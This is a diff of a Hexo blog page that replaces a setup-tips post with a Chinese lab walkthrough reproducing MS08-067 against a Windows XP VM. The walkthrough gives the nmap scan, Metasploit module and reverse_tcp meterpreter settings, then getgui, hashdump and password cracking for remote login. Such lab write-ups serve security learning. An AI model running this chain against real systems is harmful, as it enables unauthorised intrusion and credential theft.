@@ -4,9 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="博客搭建注意事项, WYB-signal">
-    <meta name="description" content="博客搭建注意事项​    帮助我的兄弟搭建了一个同类型的架构后，发现了一些之前没有注意到的小细节，这里更一篇文章简单的说明一些。
-​    首先是环境问题，因为我们的服务器在GitHub上面，就存在一个问题，我们在正常的hexo指令下需要博">
+    <meta name="keywords" content="WYB-signal">
+    <meta name="description" content="MS08_067漏洞复现报告**
+
+漏洞复现前期准备:
+ **首先第一步，MS08_067漏洞的环境仅存与Windows XP-SP2和3中，所以靶机准备我们需要在网址：https://msdn.itellyou.cn/ 内寻找到windo">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +20,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>博客搭建注意事项 | WYB-signal</title>
+    <title>WYB-signal</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -417,12 +419,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">博客搭建注意事项</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -550,7 +552,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-18
+                    2021-12-20
                 </div>
                 
 
@@ -571,10 +573,27 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="博客搭建注意事项"><a href="#博客搭建注意事项" class="headerlink" title="博客搭建注意事项"></a>博客搭建注意事项</h2><p>​    帮助我的兄弟搭建了一个同类型的架构后，发现了一些之前没有注意到的小细节，这里更一篇文章简单的说明一些。</p>
-<p>​    首先是环境问题，因为我们的服务器在GitHub上面，就存在一个问题，我们在正常的hexo指令下需要博客，会发现博客迟迟没有动静。出现这种情况的原因是因为GitHub的国内访问速度非常缓慢，所以这样子一来我们需要在在向服务器推送静态文件的时候，打开全局代理，这样子就可以加快博客更新的时间。</p>
-<p>​    然后是博客的撰文问题，文章可以有两种方式更新，一种是在hexo命令窗口输入“hexo new ‘文章名字’”，第二种方式是在“source”文件夹内找到“-posts”文件夹，你的所有博客文章都会在这里，所以当然你可以直接在内部创建一个md文件。</p>
-<p>​    最后是一个小问题，就是在下载用cmd指令下载hexo的时候，要用以管理员身份运行。</p>
+                <p>MS08_067漏洞复现报告**</p>
+<ol>
+<li><p><strong>漏洞复现前期准备:</strong></p>
+<p> **首先第一步，MS08_067漏洞的环境仅存与Windows XP-SP2和3中，所以靶机准备我们需要在网址：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a> 内寻找到windows XP-SP3的系统，然后在VMware中选择镜像进行新建虚拟机。（我下的是windows XP-SP3所以后面以此为例）<img src="D:\hexo\source\photo\图片1.png" alt="图片1"></p>
+<p> <strong>第二步，在以上设置完成以后，在百度上面找到windows XP-SP3的激活码（网上有一大堆，多试试就可以），设置网络为”桥接模式”，进入界面。在”开始”中找到”控制面板”，右下角找到”安全中心”，在安全中心内关闭防火墙。重启后前期准备就完成了。</strong></p>
+<p> <img src="D:\hexo\source\photo\图片3.png" alt="图片2"></p>
+</li>
+<li><p><strong>MS08_067漏洞的复现：</strong></p>
+<p> <strong>首先在winXP-SP3中，使用”win+R”组合热键，然后输入cmd。开启命令行，输入”ipconfig”查看winXP-SP3的IP网段,然后在kali中找到”连接信息”。找到IP（kali攻击机）观察两个主机处于同一网段下——192.168.3的同一网段下。</strong></p>
+<p> <img src="D:\hexo\source\photo\图片5.png" alt="图片4"></p>
+<p> 然后，用nmap进行网段扫描，用的命令为”nmap -sV -n 192.168.3.38”是扫描发现445端口为开启状态。命令行中”-sV”表示”扫描系统版本及服务信息”，”-n”加快扫描进度。得到如下示意图。<img src="D:\hexo\source\photo\图片6.png" alt="图片6"></p>
+<p> 接下来，打开msfconsole，开始进行攻击。</p>
+<p> <img src="D:\hexo\source\photo\图片7.png" alt="图片7"></p>
+<p> 输入”search ms08_067”找到ms08_067攻击模块路径，exploit/windows/smb/ms08_067_netapi，使用命令行”use exploit/windows/smb/ms08_067_netapi”进行模块的使用。用命令”show options”来查询需要配置的模块参数，得到如下的参数。主要的配置参数为”RHOST”为”受害者IP”，”LHOST”为”攻击者IP”，”PAYLOAD”，”TARGET”。<img src="D:\hexo\source\photo\图片8.png" alt="图片8"></p>
+<p> 接下来，我们配置这四个参数：”RHOST”用命令”set RHOST 192.168.3.38”;”PAYLOAD”用”set payload windows/meterpreter/reverse_tcp”;”TARGET”用命令”set target 34”；”LHOST”是自动配置的本机地址。<img src="D:\hexo\source\photo\图片9.png" alt="图片9"></p>
+<p> 配置完成以后输入指令”run”，进行攻击。</p>
+<p> <img src="D:\hexo\source\photo\图片10.png" alt="图片10"></p>
+<p> 得到如下反弹shell即使完成了攻击。接下来，我们打开他的远程端口——3389，使用命令”run getgui -e”开启3389端口，然后使用命令行”hashdump”跑出”受害者”的md5值。然后按两次tab打开终端换算密码得到密码”123456”，最后远程登陆，完成ms08_067复现。</p>
+<p> <img src="D:\hexo\source\photo\图片11.png" alt="图片11"></p>
+</li>
+</ol>
 
                 
             </div>
@@ -601,7 +620,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/11/18/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">http://example.com/2021/11/18/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</a>
+                    <a href="http://example.com/2021/12/20/MS08_067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">http://example.com/2021/12/20/MS08_067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1074,9 +1093,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/12/20/MS08_067%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
@@ -1094,9 +1114,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-20
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1105,6 +1125,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1115,13 +1136,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/11/01/CTF%E5%85%B3%E4%BA%8E%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B/">
+                <a href="/2021/11/18/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="CTF关于压缩包的常见题型">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="博客搭建注意事项">
                         
-                        <span class="card-title">CTF关于压缩包的常见题型</span>
+                        <span class="card-title">博客搭建注意事项</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1132,7 +1153,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-18
                             </span>
                         <span class="publish-author">
                             
